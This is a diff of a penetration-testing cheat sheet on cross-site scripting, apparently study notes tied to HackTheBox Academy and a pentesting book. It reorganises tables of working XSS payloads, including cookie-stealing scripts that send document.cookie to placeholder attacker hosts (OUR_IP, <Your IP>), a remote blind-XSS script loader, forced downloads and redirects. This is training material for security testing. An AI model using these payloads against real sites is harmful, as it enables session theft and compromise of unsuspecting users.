@@ -30,9 +30,7 @@ XSS vulnerabilities take advantage of a flaw in user input sanitization to "writ
 3. If used in client-side JavaScript, you could exploit a DOM XSS - pay attention how your input is controlled and if your controlled input is used by any sink.
 
 # XSS Testing Payloads
-Code review is the most reliable way to get a XSS rather than throwing automated tooling at a website. Remember to check where your input is presenting itself to understand the context and what will work depending on that (See Notes below).
-- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
-- [PayloadBox](https://github.com/payloadbox/xss-payload-list)
+Code review is the most reliable way to get a XSS rather than throwing automated tooling at a website. Remember to check where your input is presenting itself to understand the context and what will work depending on that (See Notes below)
 
 | Description | Code |
 |-------------|------|
@@ -47,16 +45,22 @@ Code review is the most reliable way to get a XSS rather than throwing automated
 | Change Background Image | `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` |
 | Change Website Title | `<script>document.title = 'HackTheBox Academy'</script>` |
 | Overwrite website's main body | `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` |
-| Remove certain HTML element | `<script>document.getElementById('urlform').remove();</script>` |
-| Load remote script to look for blind XSS | `<script src="http://OUR_IP/script.js"></script>` |
-| Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |
+
 
 # XSS Payloads
+- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
+- [PayloadBox](https://github.com/payloadbox/xss-payload-list)
+
 | Description | Code |
 |-------------|------|
-| Cookie Stealing XSS | <script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script> |
-| Forcing the Download of a File | <script>var link = document.createElement('a'); link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = ''; document.body.appendChild(link); link.click();</script> |
-| Redirecting User | <script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script> |
+| Cookie Stealing XSS | `<script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script>` |
+| Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |
+| Forcing the Download of a File | `<script>var link = document.createElement('a'); link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = ''; document.body.appendChild(link); link.click();</script>` |
+| Redirecting User | `<script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>` |
+| Remove certain HTML element | `<script>document.getElementById('urlform').remove();</script>` |
+| Load remote script to look for blind XSS | `<script src="http://OUR_IP/script.js"></script>` |
+
 
 Kim, Peter. The Hacker Playbook 3: Practical Guide To Penetration Testing (p. 93). Secure Planet. Kindle Edition. 
 # Notes
